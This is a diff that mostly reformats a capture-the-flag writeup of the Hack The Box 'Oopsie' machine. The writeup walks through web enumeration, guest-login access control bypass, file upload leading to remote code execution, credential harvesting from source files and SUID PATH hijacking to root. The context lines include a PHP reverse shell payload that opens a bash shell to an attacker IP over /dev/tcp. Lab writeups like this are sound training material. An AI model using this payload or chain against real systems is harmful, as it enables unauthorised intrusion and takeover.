@@ -1,8 +1,7 @@
 # HTB Oopsie Writeup
-
-**Focus Areas:** Web Enumeration, Access Control, Privilege Escalation, RCE  
-**Category:** Web / Linux – Starting Point  
-**Difficulty:** Easy<br>
+**Focus Areas:** Offensive Web Exploitation, Authentication Bypass, Session Manipulation, Remote Code Execution (RCE), Linux 
+Privilege Escalation via Misconfiguration and PATH Hijacking  
+**Category:** Web / Linux  
 **Done by:** Razan Salah  
 
 ---
@@ -12,15 +11,16 @@
 Oopsie is a web-focused Hack The Box machine that demonstrates how low-severity vulnerabilities such as information disclosure and broken access
 control can be chained into full system compromise. The attack path begins with reconnaissance and web enumeration using Nmap, Gobuster, and Burp Suite 
 to identify hidden functionality and weak access controls. By abusing insecure session handling and client-side trust, administrative functionality 
-is exposed, allowing file upload abuse to achieve remote code execution through a PHP reverse shell. Post-exploitation enumeration reveals credential d
-isclosure for lateral movement, followed by privilege escalation through a misconfigured SUID binary, ultimately resulting in root access.
+is exposed, allowing file upload abuse to achieve remote code execution through a PHP reverse shell. Post-exploitation enumeration reveals credential disclosure for lateral movement, followed by privilege escalation through a misconfigured SUID binary, ultimately resulting in root access.
 
 ---
 
 # 1. Reconnaissance
+
 This phase focused on identifying exposed services and selecting the most viable initial attack surface.
 
 ## 1.1 Port Discovery
+
 An Nmap scan was performed to identify open ports and running services on the target.
 
 **Command:** 
@@ -59,7 +59,7 @@ Burp Suite was used as a passive proxy to map the application during normal brow
 
 ## 2.2 Login Discovery
 
-Browsing to /cdn-cgi/login exposed the application login page.Standard login attempts were unsuccessful, but the application allowed access through a guest login option.
+Browsing to /cdn-cgi/login exposed the application login page. Standard login attempts were unsuccessful, but the application allowed access through a guest login option.
 
 It was possible to spot directories and files that were not visible while browsing. One particularly interesting directory was /cdn-cgi/login, which presented the login page:
 
@@ -90,7 +90,7 @@ user=2233
 
 ## 3.2 User Enumeration
 
-The application exposed user identifiers through the id parameter in the admin panel. Modifying this value allowed enumeration of other users and revealed the administrator account identifier.
+The application exposed user identifiers through the id parameter in the admin panel. Modifying this value allowed enumeration of other users and revealed the administrator account identifier.<br>
 http://10.129.143.127/cdn-cgi/login/admin.php?content=accounts&id=1
 
 ![User Enumeration](images/user-enumeration.png) 
@@ -117,8 +117,9 @@ Payload Used:
 system("bash -c 'bash -i >& /dev/tcp/10.10.15.27/4444 0>&1'");
 ?>  
 ```
+Upload Panel:
 
-Upload Panel: ![Upload Panel](images/shell-upload-panel.png) 
+![Upload Panel](images/shell-upload-panel.png) 
 
 ## 4.2 Reverse Shell Delivery
 
@@ -158,12 +159,12 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 Application files under the web root were reviewed for sensitive information. During enumeration, credentials were identified within application source files, revealing reusable authentication material. However, they did not work.
 
+Location: /var/www/html/cdn-cgi/login
+
 Command:
 ```bash
 cat * | grep -i passw*
 ```
-Location: /var/www/html/cdn-cgi/login
-
 ![Credential Discovery](images/credential-discovery.png) 
 
 ## 5.3 Local User Enumeration
@@ -193,10 +194,10 @@ Privilege escalation focused on identifying local misconfigurations that could b
 ## 6.1 Privilege Context Enumeration
 
 Basic privilege escalation checks were performed:
-
 sudo -l,
 id
-![elevating privileges](images /elevating-privileges.png) 
+
+![elevating privileges](images/elevating-privileges.png) 
 
 The output of id confirmed that the user robert belonged to the bugtracker group, indicating a potential privilege escalation path through group-owned binaries.
 
@@ -245,15 +246,15 @@ bugtracker
 ![Root Shell](images/root-shell.png) 
 
 # 7. Flags
-*User flag retrieved from /home/robert/user.txt
-*Root flag retrieved from /root/root.txt
+*User flag retrieved from /home/robert/user.txt <br>
+*Root flag retrieved from /root/root.txt <br>
 
 # 8. Lessons Learned
-*Low-severity web flaws can become critical when chained together.
-*Client-side trust should never be relied on for authorization.
-*Unrestricted file upload can directly lead to remote code execution.
-*Application source files often expose credentials useful for post-exploitation.
-*SUID binaries should be audited for unsafe execution behavior and PATH abuse.
+*Low-severity web flaws can become critical when chained together.<br>
+*Client-side trust should never be relied on for authorization.<br>
+*Unrestricted file upload can directly lead to remote code execution.<br>
+*Application source files often expose credentials useful for post-exploitation.<br>
+*SUID binaries should be audited for unsafe execution behavior and PATH abuse.<br>
 
 # Congratulations!
 
